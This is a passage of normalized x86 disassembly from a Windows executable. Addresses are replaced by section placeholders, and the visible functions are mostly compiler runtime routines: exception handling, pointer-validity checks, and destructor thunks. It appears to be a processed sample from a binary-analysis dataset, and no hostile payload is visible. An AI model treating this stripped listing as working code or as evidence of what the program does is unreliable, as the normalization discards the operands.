jb r-xdata
cmp ah bl
ja r-xdata
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_410259
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
push [ edi ]
call sub_40db20
inc eax
push eax
call sub_408e6a
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov [ esi + 0x8 ] 0x1
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_40e2b0
pop ecx
pop ecx
sub_410296
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_40db20
inc eax
push eax
call sub_408e6a
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_40e2b0
pop ecx
pop ecx
jmp r-xdata
sub_401250
push 0x0
call sub_401160
retn 0x10
sub_401260
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_401280
or cl al
mov [ rw-data ] cl
sub_401280
push sub_401290
call sub_408893
pop ecx
retn
sub_401290
retn
sub_401a00
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_401a20
or cl al
mov [ rw-data ] cl
sub_401a20
push sub_401290
call sub_408893
pop ecx
retn
sub_401cb0
push esi
mov esi ecx
call sub_401cd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
add esp 0x4
sub_40224c
mov ecx [ ebp - 0x18 ]
push 0xea60
mov edx [ ecx + 0x28 ]
call [ edx + 0x1394 ]
mov eax r-xdata
retn
sub_402270
push esi
mov esi ecx
call sub_402290
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
add esp 0x4
sub_404020
mov eax ecx
mov ecx [ esp + 0x4 ]
mov dl [ ecx ]
xor ecx ecx
mov [ eax ] dl
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn 0x4
sub_4042d0
mov edx [ ecx ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_404349
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
add eax 0x2
test eax eax
jge r-xdata
push eax
call sub_408e6a
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_404470
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_404490
or cl al
mov [ rw-data ] cl
sub_404490
push sub_401290
call sub_408893
pop ecx
retn
sub_404cc0
push esi
mov esi [ esp + 0x8 ]
push 0x0
push 0x0
push 0x0
call [ esi + 0x1258 ]
push rw-data
mov [ rw-data ] eax
call [ esi + 0x1320 ]
pop esi
retn
sub_404f90
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_404fb0
or cl al
mov [ rw-data ] cl
sub_404fb0
push sub_401290
call sub_408893
pop ecx
retn
sub_404fc0
mov eax ecx
retn
sub_404fd0
mov edx ecx
push edi
mov ecx 0x80
mov eax 0x10001000
lea edi [ edx + 0x504c ]
[ edi ]
lea edi [ edx + 0x524c ]
mov ecx 0x800
[ edi ]
pop edi
retn
sub_405e80
lea eax [ esp + 0x4 ]
push 0x1
push eax
call sub_405d00
dec eax
neg eax
sbb eax eax
retn 0x4
sub_405f80
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
push eax
call sub_4083b0
add esp 0x4
mov [ esi ] 0x0
xor eax eax
pop esi
retn 0x4
sub_405fe0
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
retn
push eax
call sub_4083b0
pop ecx
sub_406090
retn
sub_408380
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_4083a0
or cl al
mov [ rw-data ] cl
sub_4083a0
push sub_401290
call sub_408893
pop ecx
retn
sub_408487
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40848e
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4086b4
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408758
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4087e2
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_408758
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40880e
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_408893
push [ esp + 0x4 ]
call sub_408826
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_408aa0
call sub_40b69b
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40b525
add esp 0x10
retn
retn
sub_408ac0
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_408aa0
add esp 0xc
retn
sub_408e5f
push [ esp + 0x4 ]
call sub_4083b0
pop ecx
retn
sub_408e6a
push 0x1
push [ esp + 0x8 ]
call sub_4083f1
pop ecx
pop ecx
retn
sub_408f93
push [ esp + 0x4 ]
call sub_408f08
pop ecx
retn
sub_409318
mov [ ecx ] r--data
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
push ecx
call sub_4083b0
pop ecx
sub_40932d
push esi
mov esi ecx
call sub_409318
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
pop ecx
sub_4093d5
call sub_4093ed
call sub_40c622
mov [ rw-data ] eax
call sub_40c5d2
fnclex
retn
sub_4093ec
retn
sub_4093ed
mov eax sub_40ca10
mov [ rw-data ] sub_40c6a5
mov [ rw-data ] eax
mov [ rw-data ] sub_40c70b
mov [ rw-data ] sub_40c64b
mov [ rw-data ] sub_40c6f3
mov [ rw-data ] eax
retn
sub_409649
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_40d1b5
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_40d17c
sub_40a5b1
push [ ebp - 0x14 ]
call sub_40a5e8
pop ecx
retn
sub_40a5e8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40aa4c
xor eax eax
retn
sub_40a715
push [ ebp - 0x14 ]
call sub_40a785
pop ecx
retn
sub_40a967
push 0x1
pop eax
retn
sub_40a96b
mov esp [ ebp - 0x18 ]
jmp sub_40aa4c
sub_40a9c9
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40a9d2
mov esp [ ebp - 0x18 ]
jmp sub_40aa4c
sub_40aa89
push 0x1
pop eax
retn
sub_40aadf
push 0x1
pop eax
retn
sub_40ac18
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40ad00
push rw-data
push rw-data
call sub_40ad00
add esp 0x10
retn
call eax
sub_40ac45
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40ac67
add esp 0xc
retn
sub_40ac56
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40ac67
add esp 0xc
retn
sub_40aeb8
push 0x1
call sub_40aec1
pop ecx
retn
sub_40bdaa
push sub_40bd64
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40bdbb
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40c5a7
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40c5b4
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40c5c4
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_40c5d2
push 0x30000
push 0x10000
call sub_40dcba
pop ecx
pop ecx
retn
sub_40c6f3
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_40c9c6
push [ esp + 0x10 ]
mov [ rw-data ] 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40c749
and [ rw-data ] 0x0
add esp 0x10
retn
sub_40c9ed
push [ esp + 0xc ]
mov [ rw-data ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40c84d
and [ rw-data ] 0x0
add esp 0xc
retn
sub_40d161
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_40877a
add esp 0x8
pop ebp
retn 0x4
sub_40d308
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40d324
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40d340
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40d695
call sub_40aeb8
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40ec3b
sub_40d6ed
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40dac6
push 0x1
pop eax
retn
sub_40dcba
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_40dc85
pop ecx
pop ecx
retn
sub_40e21c
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40e0b0
add esp 0xc
retn
sub_40e232
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40e0b0
add esp 0xc
retn
sub_40e598
push 0x2
call sub_409624
pop ecx
retn
sub_40e5a1
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40e5b2
add esp 0xc
retn
sub_40e9a7
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40e5e3
pop ecx
mov [ rw-data ] 0x1
sub_40eee9
push 0x1
pop eax
retn
sub_40ef9d
push 0x1
pop eax
retn
sub_40fcfe
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40fd65
push esi
mov esi ecx
call sub_40fd28
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
pop ecx
sub_40fe54
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40fd81
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_40ff3c
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_40fd81
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4100b9
test [ rw-data ] 0x1
jne r-xdata
call sub_4100e3
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_4100ef
or [ rw-data ] 0x1
sub_4100e3
push sub_401290
call sub_408893
pop ecx
retn
sub_4100ef
push sub_4100fb
call sub_408893
pop ecx
retn
sub_4100fb
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41023d
push esi
mov esi ecx
call sub_4102e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
pop ecx
sub_4102e0
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_408e5f
pop ecx
sub_4102f6
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_410304
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_410330
lea ecx [ ebp - 0x140 ]
jmp sub_401cd0
sub_41033b
mov eax r--data
jmp sub_4084e4
sub_410350
lea ecx [ ebp - 0xa4 ]
jmp sub_405fe0
sub_41035b
lea ecx [ ebp - 0x60 ]
jmp sub_401bf0
sub_410363
mov eax r--data
jmp sub_4084e4
sub_410370
lea ecx [ ebp - 0x534 ]
jmp sub_405fe0
sub_41037b
lea ecx [ ebp - 0x4b8 ]
jmp sub_401bf0
sub_410386
lea ecx [ ebp - 0x490 ]
jmp sub_401bf0
sub_410391
mov eax r--data
jmp sub_4084e4
sub_4103a0
lea ecx [ ebp - 0x34 ]
jmp sub_401bf0
sub_4103a8
mov eax r--data
jmp sub_4084e4
sub_4103c0
lea ecx [ ebp - 0x34 ]
jmp sub_401bf0
sub_4103c8
mov eax r--data
jmp sub_4084e4
sub_4103e0
mov ecx [ ebp - 0x1a0 ]
add ecx 0x4
jmp sub_404040
sub_4103ee
mov ecx [ ebp - 0x1a0 ]
add ecx 0x14
jmp sub_404040
sub_4103fc
mov eax r--data
jmp sub_4084e4
sub_410410
mov eax [ ebp - 0x24 ]
push eax
call sub_408e5f
pop ecx
retn
sub_41041b
mov ecx [ ebp - 0x24 ]
add ecx 0x10
jmp sub_404040
sub_410426
mov ecx [ ebp - 0x24 ]
add ecx 0x20
jmp sub_404040
sub_410431
mov ecx [ ebp - 0x24 ]
add ecx 0x30
jmp sub_404040
sub_41043c
mov ecx [ ebp - 0x24 ]
add ecx 0x40
jmp sub_404040
sub_410447
mov ecx [ ebp - 0x24 ]
add ecx 0x58
jmp sub_4040b0
sub_410452
lea ecx [ ebp - 0x40 ]
jmp sub_404040
sub_41045a
lea ecx [ ebp - 0x50 ]
jmp sub_404040
sub_410462
lea ecx [ ebp - 0x60 ]
jmp sub_404040
sub_41046a
mov eax [ ebp - 0x64 ]
push eax
call sub_408e5f
pop ecx
retn
sub_410475
mov eax r--data
jmp sub_4084e4
sub_410480
mov ecx [ ebp - 0x18 ]
add ecx 0x10
jmp sub_404040
sub_41048b
mov ecx [ ebp - 0x18 ]
add ecx 0x20
jmp sub_404040
sub_410496
mov ecx [ ebp - 0x18 ]
add ecx 0x30
jmp sub_404040
sub_4104a1
mov ecx [ ebp - 0x18 ]
add ecx 0x40
jmp sub_404040
sub_4104ac
mov ecx [ ebp - 0x18 ]
add ecx 0x58
jmp sub_4040b0
sub_4104b7
mov ecx [ ebp - 0x18 ]
add ecx 0x64
jmp sub_4040b0
sub_4104c2
mov eax r--data
jmp sub_4084e4
sub_4104d0
lea ecx [ ebp - 0x6c ]
jmp sub_404040
sub_4104d8
lea ecx [ ebp - 0x5c ]
jmp sub_404040
sub_4104e0
lea ecx [ ebp - 0x4c ]
jmp sub_404040
sub_4104e8
lea ecx [ ebp - 0x3c ]
jmp sub_404040
sub_4104f0
lea ecx [ ebp - 0x24 ]
jmp sub_4040b0
sub_4104f8
lea ecx [ ebp - 0x7c ]
jmp sub_402290
sub_410500
mov eax [ ebp - 0x80 ]
push eax
call sub_408e5f
pop ecx
retn
sub_41050b
mov ecx [ ebp - 0x80 ]
add ecx 0x10
jmp sub_404040
sub_410516
mov ecx [ ebp - 0x80 ]
add ecx 0x20
jmp sub_404040
sub_410521
mov ecx [ ebp - 0x80 ]
add ecx 0x30
jmp sub_404040
sub_41052c
mov ecx [ ebp - 0x80 ]
add ecx 0x40
jmp sub_404040
sub_410537
mov ecx [ ebp - 0x80 ]
add ecx 0x58
jmp sub_4040b0
sub_410542
lea ecx [ ebp - 0xa0 ]
jmp sub_404040
sub_41054d
lea ecx [ ebp - 0x90 ]
jmp sub_404040
sub_410558
lea ecx [ ebp - 0x6c ]
jmp sub_404040
sub_410560
lea ecx [ ebp - 0x5c ]
jmp sub_404040
sub_410568
lea ecx [ ebp - 0x4c ]
jmp sub_404040
sub_410570
lea ecx [ ebp - 0x3c ]
jmp sub_404040
sub_410578
lea ecx [ ebp - 0x24 ]
jmp sub_4040b0
sub_410580
lea ecx [ ebp - 0x18 ]
jmp sub_4040b0
sub_410588
mov eax r--data
jmp sub_4084e4
sub_4105a0
lea ecx [ ebp - 0x5d4 ]
jmp sub_404040
sub_4105ab
lea ecx [ ebp - 0x2a8 ]
jmp sub_401bf0
sub_4105b6
mov eax r--data
jmp sub_4084e4
sub_4105c0
mov eax r--data
jmp sub_4084e4
sub_4105d0
lea ecx [ ebp - 0x5c ]
jmp sub_401bf0
sub_4105d8
lea ecx [ ebp - 0x5c ]
jmp sub_401bf0
sub_4105e0
lea ecx [ ebp - 0x34 ]
jmp sub_401bf0
sub_4105e8
mov eax r--data
jmp sub_4084e4
sub_410600
lea ecx [ ebp - 0x434 ]
jmp sub_401bf0
sub_41060b
mov eax r--data
jmp sub_4084e4
sub_410620
mov eax r--data
jmp sub_4084e4
sub_410630
mov eax r--data
jmp sub_4084e4
sub_410640
lea ecx [ ebp - 0x1c ]
jmp sub_404040
sub_410648
mov eax r--data
jmp sub_4084e4
sub_410660
lea ecx [ ebp - 0x1c ]
jmp sub_404040
sub_410668
mov eax r--data
jmp sub_4084e4
sub_410680
lea ecx [ ebp - 0x438 ]
jmp sub_404040
sub_41068b
mov eax r--data
jmp sub_4084e4
sub_4106a0
mov eax r--data
jmp sub_4084e4
sub_4106ac
lea ecx [ ebp - 0x20 ]
jmp sub_404040
sub_4106b4
mov eax r--data
jmp sub_4084e4
sub_4106c0
mov ecx [ ebp - 0x14 ]
jmp sub_4102e0
sub_4106c8
mov eax r--data
jmp sub_4084e4
sub_4106d4
mov ecx [ ebp - 0x10 ]
jmp sub_4102e0
sub_4106dc
mov eax r--data
jmp sub_4084e4
sub_4106e8
mov ecx [ ebp - 0x10 ]
jmp sub_4102e0
sub_4106f0
mov eax r--data
jmp sub_4084e4
sub_4106fc
mov ecx [ ebp - 0x10 ]
jmp sub_4102e0
sub_410704
mov eax r--data
jmp sub_4084e4
sub_410710
lea ecx [ ebp - 0x20 ]
jmp sub_404040
sub_410718
mov eax r--data
jmp sub_4084e4
sub_410724
mov ecx [ ebp - 0x10 ]
jmp sub_4102e0
sub_41072c
mov eax r--data
jmp sub_4084e4
